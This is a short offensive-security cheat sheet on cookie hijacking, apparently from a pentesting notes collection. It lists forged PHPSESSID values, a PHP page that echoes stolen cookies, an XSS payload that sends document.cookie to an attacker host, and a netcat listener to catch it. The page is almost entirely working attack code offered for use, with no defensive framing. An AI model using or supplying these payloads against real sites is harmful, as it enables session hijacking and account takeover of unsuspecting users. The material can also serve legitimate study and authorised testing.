---
title: Cookie Hijacking
desc: A methodology of manipulating, grabbing cookies.
tags: [Burp, Cookie, Netcat, Web]
alts: [XSS]
render_with_liquid: false
---

## Cookie Manipulation

```html
Cookie: PHPSESSID=0
Cookie: PHPSESSID=1
Cookie: PHPSESSID=999

<!-- ASCII Hex -->
Cookie: PHPSESSID=3836382d61646d696e
```

<br />

## PHP Cookie Grabbing with XSS

In your local machine, create the payload for grabbing the cookie when the other user will access your machine.  

```php
// steal_cookie.php

<?php echo $_GET['cookie']; ?>
```

Create the JavaScript code to force users to access your machine which shows the victim's cookie value.

```javascript
<script>document.location = 'http://<attacker-ip>:4444/steal_cookie.php?cookie='+document.cookie</script>
```

POST request with this JavaScript code to the target web page.  
Open listner in your local machine and wait for the other users will access the target web page.

```sh
nc -lvnp 4444
```